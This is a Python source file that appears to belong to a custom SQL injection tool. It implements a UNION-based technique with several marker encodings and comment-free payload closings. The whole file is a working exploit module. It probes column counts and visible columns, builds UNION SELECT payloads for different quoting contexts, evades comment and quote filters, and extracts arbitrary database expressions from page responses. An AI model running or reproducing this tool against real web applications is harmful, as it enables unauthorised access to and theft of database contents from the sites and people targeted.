# -*- coding: utf-8 -*-
"""UNION-based injection (v1.1: multiple reflected-marker encodings + comment-free closing)

Marker encodings are tried in order: hex(MySQL) -> quoted string(generic) -> CHAR() concatenation.
hex is the least troublesome, but it does not hold for every DBMS/scenario
(e.g. SQLite treats 0x.. as an integer, so what is reflected is a number, not a string),
so the probe phase cycles through them and picks the one that actually reflects the marker.
"""
import re
from techniques.base import BaseTechnique


class UnionTechnique(BaseTechnique):
    name = "Union Based"

    # (start marker expression, end marker expression, start text, end text)
    MARKER_FORMS = [
        ("0x58715A39", "0x5A713958", "XqZ9", "Zq9X"),
        ("'XqZ9'", "'Zq9X'", "XqZ9", "Zq9X"),
        ("CHAR(88,113,90,57)", "CHAR(90,113,57,88)", "XqZ9", "Zq9X"),
    ]

    MARKER_LABELS = ["hex(0x..)", "quoted string", "CHAR() concatenation"]

    def __init__(self, *args, force_cols=None, force_visible_col=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.col_count = force_cols or 0
        self.visible_col = force_visible_col or 0
        self.marker_idx = 0
        self.concat_tpl = self.dialect.concat_templates()[0]

    # ---------------- Payload assembly ----------------
    def _union_payload(self, select_body):
        """Assemble by closing style; no comment characters used at all (comment-free handles comments being banned)."""
        closure = (self.det.closure_name or "numeric").lower()
        body = f"UNION SELECT {select_body}"

        if "paren-numeric" in closure:
            return f"-1) {body}"
        if closure.startswith("single") or "paren-single" in closure:
            return f"-1' {body} AND '1'='1"
        if closure.startswith("double"):
            return f'-1" {body} AND "1"="1'
        # numeric: naturally valid, no comment needed
        return f"-1 {body}"

    def _s_expr(self):
        return self.MARKER_FORMS[self.marker_idx][0]

    def _e_expr(self):
        return self.MARKER_FORMS[self.marker_idx][1]

    def _s_str(self):
        return self.MARKER_FORMS[self.marker_idx][2]

    def _e_str(self):
        return self.MARKER_FORMS[self.marker_idx][3]

    # ---------------- Reflected-output detection ----------------
    # Many targets (especially with debug on) reflect the executed SQL back too,
    # so the marker text in the payload also appears on the page, and a naive grep reads the payload itself.
    # The two methods below only accept marker occurrences "not preceded by a quote / HTML entity".
    _PRE_ENTITIES = ("&#x27;", "&quot;", "&apos;", "&#39;")

    def _marker_present(self, text):
        for m in re.finditer(re.escape(self._s_str()), text):
            pre1 = text[max(0, m.start() - 1):m.start()]
            pre6 = text[max(0, m.start() - 6):m.start()]
            if pre1 in ("'", '"') or pre6.endswith(self._PRE_ENTITIES):
                continue
            return True
        return False

    def _extract_between(self, text):
        pattern = (re.escape(self._s_str()) + r"(.*?)" + re.escape(self._e_str()))
        for m in re.finditer(pattern, text, re.DOTALL):
            val = m.group(1)
            pre1 = text[max(0, m.start() - 1):m.start()]
            pre6 = text[max(0, m.start() - 6):m.start()]
            # Skip the payload's own reflection: content carries SQL syntax characters, or directly follows a quote
            if any(ch in val for ch in "'\"()|=,<>"):
                continue
            if pre1 in ("'", '"') or pre6.endswith(self._PRE_ENTITIES):
                continue
            return val.strip()
        return ""

    # ---------------- Marker form order ----------------
    def _form_order(self):
        # hex is least troublesome on MySQL; quoted strings are more reliable on other DBMS (hex is often taken as an integer)
        if self.dialect.name == "mysql":
            return [0, 1, 2]
        return [1, 0, 2]

    # ---------------- Probe ----------------
    def probe(self):
        if self.col_count > 0 and self.visible_col > 0:
            print(f"    [+] Using manual values: column count={self.col_count}, visible column={self.visible_col}")
            return True

        for idx in self._form_order():
            self.marker_idx = idx
            if self._probe_columns() and self._selftest():
                print(f"    [+] Reflected marker: {self.MARKER_LABELS[idx]}")
                return True
        print("    [-] UNION-based injection probe failed (is the union keyword blocked? try --tamper keyword_nest)")
        return False

    def _selftest(self):
        """End-to-end self-test: run a real extract on a known constant to confirm the extraction path works.

        _probe_columns() only verifies that "the marker can appear on the page", whereas the **real extraction**
        also goes through a concat_templates() concatenation -- a dialect misidentification shows up here
        (typically: MySQL CONCAT used on SQLite, so the probe "succeeds" but extraction is constantly empty).
        Failing this stage degrades to "probe succeeds but everything is empty the moment you fetch data".

        Deliberately uses a **numeric constant** (no quotes): if the target filters single-quotes, the self-test still passes.
        """
        probe = "98765"
        try:
            return self.extract(f"({probe})") == probe
        except Exception:
            return False

    def _probe_columns(self):
        if self.col_count <= 0:
            print(f"    [*] Probing column count...")
            found = 0
            for n in range(1, 16):
                nums = [self._s_expr()] * n
                payload = self._t(self._union_payload(",".join(nums)))
                r = self.req.send(payload)
                if r["status"] == -1:
                    continue
                if self._marker_present(r["text"]):
                    found = n
                    break
            if not found:
                return False
            self.col_count = found
            print(f"    [+] Column count: {found}")

        if self.visible_col <= 0:
            print(f"    [*] Probing visible column...")
            for i in range(1, self.col_count + 1):
                nums = ["NULL"] * self.col_count
                nums[i - 1] = self._s_expr()
                payload = self._t(self._union_payload(",".join(nums)))
                r = self.req.send(payload)
                if r["status"] == -1:
                    continue
                if self._marker_present(r["text"]):
                    self.visible_col = i
                    print(f"    [+] Visible column: column {i}")
                    return True
            return False
        return True

    # ---------------- Extraction ----------------
    def _cond_true(self, condition):
        return True

    def extract(self, sql_expr):
        nums = ["NULL"] * self.col_count
        nums[self.visible_col - 1] = self.concat_tpl.format(
            a=self._s_expr(), b=f"({sql_expr})", c=self._e_expr()
        )
        payload = self._t(self._union_payload(",".join(nums)))
        r = self.req.send(payload)
        if r["status"] == -1:
            return ""
        return self._extract_between(r["text"])

    def extract_length(self, sql_expr):
        return len(self.extract(sql_expr))
